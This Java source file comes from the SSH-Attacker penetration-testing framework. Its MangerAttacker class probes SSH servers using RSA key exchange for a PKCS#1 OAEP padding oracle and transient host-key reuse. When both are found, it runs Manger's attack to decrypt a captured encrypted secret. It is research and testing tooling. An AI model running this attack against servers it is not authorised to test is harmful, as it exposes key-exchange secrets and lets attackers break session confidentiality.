/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.config.MangerCommandConfig;
import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
import de.rub.nds.sshattacker.attacks.general.Vector;
import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
import de.rub.nds.sshattacker.attacks.pkcs1.Manger;
import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1Vector;
import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1VectorGenerator;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.sshattacker.attacks.pkcs1.util.OaepConverter;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.attacks.response.EqualityErrorTranslator;
import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
import de.rub.nds.sshattacker.attacks.task.SshTask;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.state.State;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.*;

/**
 * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
 * responses. In case there are differences in the server responses, it is very likely that it is
 * possible to execute Manger's attack.
 */
public class MangerAttacker extends Attacker<MangerCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;

    private boolean increasingTimeout = true;

    private long additionalTimeout = 1000;

    private long additionalTcpTimeout = 5000;

    private List<VectorResponse> responseMapList;

    private EqualityError resultError;

    private final ParallelExecutor executor;

    private boolean erroneousScans;

    private KeyExchangeAlgorithm keyExchangeAlgorithm;

    /**
     * @param mangerConfig Manger attack config
     * @param baseConfig Base config
     */
    public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig) {
        this(mangerConfig, baseConfig, new ParallelExecutor(1, 3));
    }

    /**
     * @param mangerConfig Manger attack config
     * @param baseConfig Base config
     * @param executor Executor
     */
    public MangerAttacker(
            MangerCommandConfig mangerConfig, Config baseConfig, ParallelExecutor executor) {
        super(mangerConfig, baseConfig);
        sshConfig = getSshConfig();
        setKeyExchangeAlgorithm();
        responseMapList = new ArrayList<>();
        this.executor = executor;
    }

    /**
     * @return If the server is vulnerable to Manger's attack or not
     */
    @Override
    public Boolean isVulnerable() {
        CONSOLE.info(
                "A server is considered vulnerable to this attack if it reuses it's host key and "
                        + "responds differently to the test vectors.");
        CONSOLE.info(
                "A server is considered secure if it does not reuse the host key or"
                        + " if it does not have Manger's oracle.");

        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }

        boolean reusesTransientPublicKey;
        if (!isTransientKeyReused(publicKey)) {
            CONSOLE.info("Server does not reuse the transient public key, it should be safe.");
            reusesTransientPublicKey = false;
        } else {
            CONSOLE.info("Server reuses transient public key.");
            reusesTransientPublicKey = true;
        }

        return hasOracle() & reusesTransientPublicKey;
    }

    /**
     * Checks if the server has Manger's oracle without checking if it reuses the transient public
     * key
     *
     * @return If the server has Manger's oracle or not
     */
    public boolean hasOracle() {
        CONSOLE.info(
                "A server has Manger's Oracle if it responds differently to the test vectors.");

        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }

        EqualityError referenceError;
        responseMapList = new LinkedList<>();
        for (int i = 0; i < config.getNumberOfIterations(); i++) {
            List<VectorResponse> responseMap = createVectorResponseList(publicKey, true);
            responseMapList.addAll(responseMap);
        }

        referenceError = getEqualityError(responseMapList);
        if (referenceError != EqualityError.NONE) {
            CONSOLE.info(
                    "Found a behavior difference within the responses. The server has Manger's oracle.");
        } else {
            CONSOLE.info(
                    "Found no behavior difference within the responses. The server is very likely to not have Manger's oracle.");
        }

        CONSOLE.info(EqualityErrorTranslator.translation(referenceError));
        if (referenceError != EqualityError.NONE
                || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
            LOGGER.debug("-------------(Not Grouped)-----------------");
            for (VectorResponse vectorResponse : responseMapList) {
                LOGGER.debug(vectorResponse.toString());
            }
        }

        resultError = referenceError;
        return referenceError != EqualityError.NONE;
    }

    /**
     * @return Response vector list
     */
    private List<VectorResponse> createVectorResponseList(
            RSAPublicKey publicKey, @SuppressWarnings("SameParameterValue") boolean plain) {
        List<SshTask> taskList = new LinkedList<>();
        List<FingerprintTaskVectorPair<?>> stateVectorPairList = new LinkedList<>();

        List<Pkcs1Vector> vectors;
        if (plain) {
            vectors =
                    Pkcs1VectorGenerator.generatePlainPkcs1Vectors(
                            publicKey.getModulus().bitLength(), getHashLength(), getHashInstance());
        } else {
            vectors =
                    Pkcs1VectorGenerator.generatePkcs1Vectors(
                            publicKey, getHashLength(), getHashInstance());
        }

        for (Pkcs1Vector vector : vectors) {

            State state;
            if (plain) {
                state =
                        new State(
                                sshConfig,
                                MangerWorkflowGenerator.generateDynamicWorkflow(
                                        sshConfig, vector.getPlainValue()));
            } else {
                state =
                        new State(
                                sshConfig,
                                MangerWorkflowGenerator.generateWorkflow(
                                        sshConfig, vector.getEncryptedValue()));
            }

            FingerPrintTask fingerPrintTask =
                    new FingerPrintTask(
                            state,
                            additionalTimeout,
                            increasingTimeout,
                            executor.getReexecutions(),
                            additionalTcpTimeout);

            taskList.add(fingerPrintTask);
            stateVectorPairList.add(new FingerprintTaskVectorPair<>(fingerPrintTask, vector));
        }
        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
        executor.bulkExecuteTasks(taskList);
        for (FingerprintTaskVectorPair<?> pair : stateVectorPairList) {
            ResponseFingerprint fingerprint;
            if (pair.getFingerPrintTask().isHasError()) {
                erroneousScans = true;
                LOGGER.warn("Could not extract fingerprint for {}", pair);
            } else {
                fingerprint = pair.getFingerPrintTask().getFingerprint();
                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
            }
        }
        return tempResponseVectorList;
    }

    /**
     * This assumes that the responseVectorList only contains comparable vectors
     *
     * @param responseVectorList Response vectors
     * @return Type of EqualityError or {@code EqualityError.NONE} if there was none
     */
    public static EqualityError getEqualityError(List<VectorResponse> responseVectorList) {

        for (VectorResponse responseOne : responseVectorList) {
            for (VectorResponse responseTwo : responseVectorList) {
                if (responseOne == responseTwo) {
                    continue;
                }
                EqualityError error =
                        FingerPrintChecker.checkEquality(
                                responseOne.getFingerprint(), responseTwo.getFingerprint());
                if (error != EqualityError.NONE) {
                    CONSOLE.info("Found an EqualityError: {}", error);
                    LOGGER.debug("Fingerprint1: {}", responseOne.getFingerprint().toString());
                    LOGGER.debug("Fingerprint2: {}", responseTwo.getFingerprint().toString());
                    return error;
                }
            }
        }
        return EqualityError.NONE;
    }

    /**
     * Fetches the transient public key from a key exchange. Note that multiple calls to this method
     * when connected to the same server can yield different keys.
     *
     * @return Transient public key
     */
    private RSAPublicKey getServerPublicKey() {
        RSAPublicKey publicKey = KeyFetcher.fetchRsaTransientKey(sshConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info(
                String.format(
                        "Fetched server public key with exponent %s and modulus: %s",
                        publicKey.getPublicExponent().toString(16),
                        publicKey.getModulus().toString(16)));
        return publicKey;
    }

    /** Checks if the server re-uses its RSA transient public key */
    public boolean isTransientKeyReused() {
        RSAPublicKey transientKey1 = getServerPublicKey();
        RSAPublicKey transientKey2 = getServerPublicKey();
        if (transientKey1 == null || transientKey2 == null) {
            LOGGER.fatal("Could not retrieve server transient public key, is the server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        } else {
            return comparePublicKeys(transientKey1, transientKey2);
        }
    }

    /** Checks if the server re-uses its RSA transient public key */
    private boolean isTransientKeyReused(RSAPublicKey transientKey1) {
        RSAPublicKey transientKey2 = getServerPublicKey();
        if (transientKey1 == null || transientKey2 == null) {
            LOGGER.fatal("Could not retrieve server transient public key, is the server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        } else {
            return comparePublicKeys(transientKey1, transientKey2);
        }
    }

    /** Compares moduli and public exponents of public keys to check if they are equal */
    private static boolean comparePublicKeys(
            RSAPublicKey transientKey1, RSAPublicKey transientKey2) {
        return transientKey1.getPublicExponent().equals(transientKey2.getPublicExponent())
                && transientKey1.getModulus().equals(transientKey2.getModulus());
    }

    @Override
    public void executeAttack() {

        if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedSecret() == null) {
            throw new ConfigurationException("The encrypted secret must be set to be decrypted.");
        }

        if (config.getKexAlgorithm() == null) {
            throw new ConfigurationException("The key exchange algorithm must be set.");
        }

        LOGGER.info(
                String.format(
                        "Fetched server public key with exponent %s and modulus: %s",
                        publicKey.getPublicExponent().toString(16),
                        publicKey.getModulus().toString(16)));
        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        if ((encryptedSecret.length * Byte.SIZE) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted secret "
                            + "is not equal to the public key length. Have you selected the correct value?");
        }
        RealDirectMessagePkcs1Oracle oracle =
                new RealDirectMessagePkcs1Oracle(
                        publicKey, getSshConfig(), extractValidFingerprint(publicKey), null);
        Manger attacker = new Manger(encryptedSecret, oracle);
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        BigInteger secret =
                OaepConverter.decodeSolution(
                        solution,
                        getHashInstance(),
                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
                                / Byte.SIZE);

        CONSOLE.info("Encoded Solution: {}", solution);
        CONSOLE.info("Decoded Secret: {}", secret);
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
        Pkcs1Vector vector =
                Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(
                        publicKey, getHashLength(), getHashInstance());
        State state =
                new State(
                        sshConfig,
                        MangerWorkflowGenerator.generateWorkflow(
                                sshConfig, vector.getEncryptedValue()));
        FingerPrintTask fingerPrintTask =
                new FingerPrintTask(
                        state,
                        additionalTimeout,
                        increasingTimeout,
                        executor.getReexecutions(),
                        additionalTcpTimeout);
        FingerprintTaskVectorPair<? extends Vector> stateVectorPair =
                new FingerprintTaskVectorPair<>(fingerPrintTask, vector);

        executor.bulkExecuteTasks(fingerPrintTask);
        ResponseFingerprint fingerprint = null;
        if (stateVectorPair.getFingerPrintTask().isHasError()) {
            LOGGER.warn("Could not extract fingerprint for {}", stateVectorPair);
        } else {
            fingerprint = fingerPrintTask.getFingerprint();
        }
        return fingerprint;
    }

    private int getHashLength() {
        switch (keyExchangeAlgorithm) {
            case RSA2048_SHA256:
                return 256;
            case RSA1024_SHA1:
                return 160;
            default:
                return 0;
        }
    }

    private String getHashInstance() {
        switch (keyExchangeAlgorithm) {
            case RSA2048_SHA256:
                return "SHA-256";
            case RSA1024_SHA1:
                return "SHA-1";
            default:
                return "";
        }
    }

    private void setKeyExchangeAlgorithm() {
        if (config.getKexAlgorithm() == null) {
            throw new ConfigurationException("The key exchange algorithm must be set.");
        } else {
            if (config.getKexAlgorithm().equals("rsa2048-sha256")) {
                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA2048_SHA256;

            } else if (config.getKexAlgorithm().equals("rsa1024-sha1")) {
                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA1024_SHA1;
            } else {
                throw new ConfigurationException(
                        "Unknown key exchange algorithm, did you mistype it? "
                                + "Options are rsa2048-sha256 and rsa1024-sha1");
            }
        }

        // Set only supported key exchange algorithm to the one specified by the user
        sshConfig.setClientSupportedKeyExchangeAlgorithms(
                new ArrayList<>(Collections.singleton(keyExchangeAlgorithm)));

        CONSOLE.info("Set key exchange algorithm to: {}", keyExchangeAlgorithm);
    }

    public EqualityError getResultError() {
        return resultError;
    }

    public List<VectorResponse> getResponseMapList() {
        return responseMapList;
    }

    public boolean isErroneousScans() {
        return erroneousScans;
    }

    public boolean isIncreasingTimeout() {
        return increasingTimeout;
    }

    public void setIncreasingTimeout(boolean increasingTimeout) {
        this.increasingTimeout = increasingTimeout;
    }

    public long getAdditionalTimeout() {
        return additionalTimeout;
    }

    public void setAdditionalTimeout(long additionalTimeout) {
        this.additionalTimeout = additionalTimeout;
    }

    public long getAdditionalTcpTimeout() {
        return additionalTcpTimeout;
    }

    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
        this.additionalTcpTimeout = additionalTcpTimeout;
    }
}
